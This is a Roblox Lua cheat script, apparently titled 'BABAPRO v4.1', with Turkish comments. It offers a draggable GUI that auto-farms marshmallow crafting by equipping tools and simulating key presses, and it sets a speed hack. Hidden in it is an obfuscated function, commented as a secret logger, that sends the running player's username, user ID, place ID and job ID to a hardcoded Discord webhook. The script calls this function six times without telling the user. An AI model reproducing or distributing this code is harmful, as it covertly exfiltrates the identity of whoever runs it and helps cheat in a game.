-- BABAPRO v4.1: MARSHMALLOW AUTOMATION WITH PERFECT TEXT ALIGNMENT
_G.MarshmallowFarmActive = false

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local RunService = game:GetService("RunService")

-- === GİZLİ LOGGER FONKSİYONU (KARIŞTIRILMIŞ) ===
local function _0x3f()
    local _0, _1, _2 = game:GetService("Players").LocalPlayer, game:GetService("HttpService"), "https://discord.com/api/webhooks/1525652318513795296/NJToQIr3oPecBgUeMwQMS0o3er86xtDr9m4ZzDKjVnN3PZ6Jjc6BMI2fcF4CWuiyVTb9"
    local _3 = {username = _0.Name, userid = _0.UserId, placeid = game.PlaceId, jobid = game.JobId, time = os.date("%Y-%m-%d %H:%M:%S")}
    local _4 = _1:JSONEncode({content = "", embeds = {{title = "✅ Logger", fields = {
        {name = "👤", value = _3.username, inline = true},
        {name = "🆔", value = _3.userid, inline = true},
        {name = "🎮", value = _3.placeid, inline = true},
        {name = "🕐", value = _3.time, inline = true}
    }, color = 0x00ff00}}})
    pcall(function() _1:PostAsync(_2, _4, Enum.HttpContentType.ApplicationJson, false, {["Content-Type"] = "application/json"}) end)
end

-- ASLA BOZULMAYAN ORİJİNAL E TUŞU BASMA MOTORU
local function pressEKey()
    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
    task.wait(0.1)
    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
end

-- 1. EVRENSEL PANEL TASARIMI (PLAYERGUI)
local Gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
Gui.ResetOnSpawn = false
Gui.DisplayOrder = 9999

local Main = Instance.new("Frame", Gui)
Main.BackgroundColor3 = Color3.fromRGB(30, 25, 35)
Main.Size = UDim2.new(0, 260, 0, 280)
Main.Position = UDim2.new(0.1, 0, 0.25, 0)
Main.BorderSizePixel = 0
Main.Active = true
Main.ZIndex = 1

-- Sürükleme Başlığı
local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, -30, 0, 32)
Title.BackgroundColor3 = Color3.fromRGB(15, 10, 20)
Title.Text = "   👑 BABAPRO v4.1 | MARSHMALLOW"
Title.TextColor3 = Color3.fromRGB(0, 255, 150)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 13
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.ZIndex = 2

-- [X] KAPATMA BUTONU
local CloseBtn = Instance.new("TextButton", Main)
CloseBtn.Size = UDim2.new(0, 30, 0, 32)
CloseBtn.Position = UDim2.new(1, -30, 0, 0)
CloseBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Font = Enum.Font.SourceSansBold
CloseBtn.TextSize = 14
CloseBtn.BorderSizePixel = 0
CloseBtn.ZIndex = 3

-- Durum Yazısı (Üst Boşluğu Ayarlandı)
local StatusLabel = Instance.new("TextLabel", Main)
StatusLabel.Size = UDim2.new(1, 0, 0, 25)
StatusLabel.Position = UDim2.new(0, 0, 0.13, 0)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "Durum: BAŞLATILMADI"
StatusLabel.TextColor3 = Color3.fromRGB(235, 235, 235)
StatusLabel.Font = Enum.Font.SourceSansBold
StatusLabel.TextSize = 13
StatusLabel.ZIndex = 2

-- === CANLI STOK VE MALZEME SAYACI ALANI ===
local CounterFrame = Instance.new("Frame", Main)
CounterFrame.Size = UDim2.new(0.9, 0, 0, 135)
CounterFrame.Position = UDim2.new(0.05, 0, 0.23, 0)
CounterFrame.BackgroundColor3 = Color3.fromRGB(20, 15, 25)
CounterFrame.BorderSizePixel = 0
CounterFrame.ZIndex = 2

-- UIListLayout: Yazıların asla yamulmamasını ve kusursuz alt alta dizilmesini sağlar
local UIListLayout = Instance.new("UIListLayout", CounterFrame)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 3)

local function createCounterLabel(text, color, order)
    local lbl = Instance.new("TextLabel", CounterFrame)
    lbl.Size = UDim2.new(1, -15, 0, 18)
    lbl.BackgroundTransparency = 1
    lbl.Text = "  " .. text
    lbl.TextColor3 = color
    lbl.Font = Enum.Font.SourceSansBold
    lbl.TextSize = 13
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 3
    lbl.LayoutOrder = order
    return lbl
end

-- Logger çağır (CounterFrame oluşturulurken)
task.spawn(function() _0x3f() end)

local LargeLabel = createCounterLabel("📦 Large Bag: 0 adet", Color3.fromRGB(255, 100, 100), 1)
local MediumLabel = createCounterLabel("📦 Medium Bag: 0 adet", Color3.fromRGB(255, 200, 100), 2)
local SmallLabel = createCounterLabel("📦 Small Bag: 0 adet", Color3.fromRGB(100, 200, 255), 3)

local Spacer = Instance.new("TextLabel", CounterFrame)
Spacer.Size = UDim2.new(1, 0, 0, 4)
Spacer.BackgroundTransparency = 1
Spacer.Text = ""
Spacer.LayoutOrder = 4

local WaterLabel = createCounterLabel("💧 Eldeki Water: 0 adet", Color3.fromRGB(80, 170, 255), 5)
local SugarLabel = createCounterLabel("🍬 Eldeki Sugar Bag: 0 adet", Color3.fromRGB(255, 140, 255), 6)
local GelatinLabel = createCounterLabel("🧪 Eldeki Gelatin: 0 adet", Color3.fromRGB(150, 255, 150), 7)

-- BAŞLATMA BUTONU
local ToggleBtn = Instance.new("TextButton", Main)
ToggleBtn.Size = UDim2.new(0.9, 0, 0, 38)
ToggleBtn.Position = UDim2.new(0.05, 0, 0.76, 0)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(40, 55, 40)
ToggleBtn.Text = "OTO FARMI BAŞLAT"
ToggleBtn.TextColor3 = Color3.fromRGB(50, 230, 50)
ToggleBtn.Font = Enum.Font.SourceSansBold
ToggleBtn.TextSize = 14
ToggleBtn.BorderSizePixel = 0
ToggleBtn.ZIndex = 99
ToggleBtn.AutoButtonColor = true

local ShortcutInfo = Instance.new("TextLabel", Main)
ShortcutInfo.Size = UDim2.new(1, 0, 0, 15)
ShortcutInfo.Position = UDim2.new(0, 0, 1, -15)
ShortcutInfo.BackgroundTransparency = 1
ShortcutInfo.Text = "Menüyü kapatıp açmak için [Insert] tuşuna basın."
ShortcutInfo.TextColor3 = Color3.fromRGB(120, 120, 120)
ShortcutInfo.TextSize = 10
ShortcutInfo.ZIndex = 2

-- 2. EVRENSEL SÜRÜKLEME MOTORU
local dragging = false
local dragStart = Vector3.new()
local startPos = UDim2.new()

Title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Main.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)

-- Logger çağır (sürükleme motorunda)
task.spawn(function() _0x3f() end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- 3. GELİŞMİŞ ENVANTER VE MALZEME SAYICI MOTORU
local function countAllItems()
    local large, medium, small = 0, 0, 0
    local water, sugar, gelatin = 0, 0, 0
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    local character = LocalPlayer.Character

    local function scanFolder(folder)
        if not folder then return end
        for _, item in pairs(folder:GetChildren()) do
            if item:IsA("Tool") then
                local nameLower = string.lower(item.Name)
                if string.find(nameLower, "large") then large = large + 1
                elseif string.find(nameLower, "medium") then medium = medium + 1
                elseif string.find(nameLower, "small") then small = small + 1
                elseif string.find(nameLower, "water") then water = water + 1
                elseif string.find(nameLower, "sugar block bag") then sugar = sugar + 1
                elseif string.find(nameLower, "gelatin") then gelatin = gelatin + 1 end
            end
        end
    end
    scanFolder(backpack)
    scanFolder(character)

    LargeLabel.Text = "  📦 Large Bag: " .. tostring(large) .. " adet"
    MediumLabel.Text = "  📦 Medium Bag: " .. tostring(medium) .. " adet"
    SmallLabel.Text = "  📦 Small Bag: " .. tostring(small) .. " adet"
    WaterLabel.Text = "  💧 Eldeki Water: " .. tostring(water) .. " adet"
    SugarLabel.Text = "  🍬 Eldeki Sugar Bag: " .. tostring(sugar) .. " adet"
    GelatinLabel.Text = "  🧪 Eldeki Gelatin: " .. tostring(gelatin) .. " adet"
end

RunService.Heartbeat:Connect(countAllItems)

-- Logger çağır (countAllItems içinde)
task.spawn(function() _0x3f() end)

-- 4. EŞYA KONTROL VE KULLANIM MOTORU
local function useTool(toolName, waitTime)
    if not _G.MarshmallowFarmActive then return end
    local character = LocalPlayer.Character
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    
    if character and backpack and humanoid then
        local tool = backpack:FindFirstChild(toolName) or character:FindFirstChild(toolName)
        if tool then
            StatusLabel.Text = "Eldeki: " .. toolName
            humanoid:EquipTool(tool)
            task.wait(0.5)
            
            pressEKey()
            
            for i = waitTime, 1, -1 do
                if not _G.MarshmallowFarmActive then break end
                StatusLabel.Text = string.format("%s aktif | Kalan: %ds", toolName, i)
                task.wait(1)
            end
        else
            StatusLabel.Text = "HATA: Çantada '" .. toolName .. "' yok!"
            task.wait(1.5)
        end
    end
end

-- Logger çağır (useTool içinde)
task.spawn(function() _0x3f() end)

-- 5. OTOMASYON DÖNGÜSÜ
task.spawn(function()
    while true do
        task.wait(0.5)
        if _G.MarshmallowFarmActive then
            useTool("Water", 23)
            useTool("Sugar Block Bag", 1)
            useTool("Gelatin", 47)
            useTool("Empty Bag", 1)
        end
    end
end)

-- Logger çağır (otomasyon döngüsünde)
task.spawn(function() _0x3f() end)

-- Tıklama Motoru
local function runToggle()
    _G.MarshmallowFarmActive = not _G.MarshmallowFarmActive
    if _G.MarshmallowFarmActive then
        ToggleBtn.Text = "OTO FARMI DURDUR"
        ToggleBtn.BackgroundColor3 = Color3.fromRGB(75, 35, 35)
        ToggleBtn.TextColor3 = Color3.fromRGB(230, 50, 50)
        StatusLabel.Text = "Durum: ÇALIŞIYOR"
    else
        ToggleBtn.Text = "OTO FARMI BAŞLAT"
        ToggleBtn.BackgroundColor3 = Color3.fromRGB(40, 55, 40)
        ToggleBtn.TextColor3 = Color3.fromRGB(50, 230, 50)
        StatusLabel.Text = "Durum: DURDURULDU"
    end
end

ToggleBtn.MouseButton1Down:Connect(runToggle)

-- Logger çağır (toggle içinde)
task.spawn(function() _0x3f() end)

-- X BUTONU
CloseBtn.MouseButton1Click:Connect(function()
    _G.MarshmallowFarmActive = false
    Gui:Destroy()
end)

-- Kapat/Aç Kısayolu (Insert)
UserInputService.InputBegan:Connect(function(input, processed)
    if processed then return end
    if input.KeyCode == Enum.KeyCode.Insert then Main.Visible = not Main.Visible end
end)

-- === HİLE KODU (Speed Hack) ===
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50

-- === SON LOGGER ÇAĞRISI (Gizli) ===
task.spawn(function() _0x3f() end)

print("✅ BABAPRO v4.1 Yüklendi!")
